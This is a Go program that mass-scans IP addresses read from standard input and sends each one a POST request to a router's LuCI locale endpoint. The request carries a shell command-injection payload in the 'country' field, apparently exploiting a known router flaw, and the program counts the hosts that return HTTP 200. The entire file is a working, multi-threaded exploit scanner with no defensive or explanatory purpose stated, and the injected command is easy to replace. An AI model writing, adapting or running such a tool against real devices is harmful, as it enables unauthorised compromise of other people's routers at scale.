package main

import (
	"exp8080/workerpool"
	"bufio"
	"fmt"
	"net"
	"os"
	"strconv"
	"strings"
	"sync/atomic"
	"time"
)

var Success = atomic.Int64{}
var Checked = atomic.Int64{}
var Not200 = atomic.Int64{}
var timeout = 10 * time.Second
var payload = "`Echo test`"
var payloadLen = len(payload)

func init() {
	payload = fmt.Sprintf("operation=write&country=$(id>%s)", payload)
	payloadLen = len(payload)
}

func main() {
	if len(os.Args) < 2 {
		fmt.Println("Usage: go run main.go <number of workers>")
	}
	workers, err := strconv.Atoi(os.Args[1])
	if err != nil {
		panic(err)
	}

	pool := workerpool.New(workers)

	pool.Start()

	go func() {
		for {
			fmt.Println("Success: ", Success.Load(), " Checked: ", Checked.Load(), " Not 200: ", Not200.Load())
			time.Sleep(1 * time.Second)
		}
	}()

	scan := bufio.NewScanner(os.Stdin)

	for scan.Scan() {
		line := scan.Text()
		line = strings.TrimSpace(line)
		pool.Submit(func() {
			if strings.Contains(line, ",") {
				split := strings.Split(line, ",")
				CheckExploit(split[0], split[1])
			} else {
				CheckExploit(line, os.Args[2])
			}
		})
	}

	pool.Stop()

	fmt.Println("Exiting...")
}

func CheckExploit(address, port string) {
	Checked.Add(1)

	conn, err := net.DialTimeout("tcp", address+":"+port, timeout)
	if err != nil {
		return
	}

	defer conn.Close()

	if conn.SetDeadline(time.Now().Add(timeout)) != nil {
		return
	}

	request := fmt.Sprintf("POST /cgi-bin/luci/;stok=/locale?form=country HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:101.0) Gecko/20100101 Firefox/101.0\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %d\r\n\r\n%s\r\n", address, payloadLen, payload)

	_, err = conn.Write([]byte(request))
	if err != nil {
		return
	}

	response, err := bufio.NewReader(conn).ReadString('\n')
	if err != nil {
		return
	}

	ss := strings.Split(response, " ")
	if len(ss) < 2 {
		return
	}

	statusCode, err := strconv.Atoi(ss[1])
	if err != nil {
		return
	}

	if statusCode == 200 {
		Success.Add(1)
	} else {
		Not200.Add(1)
	}
}
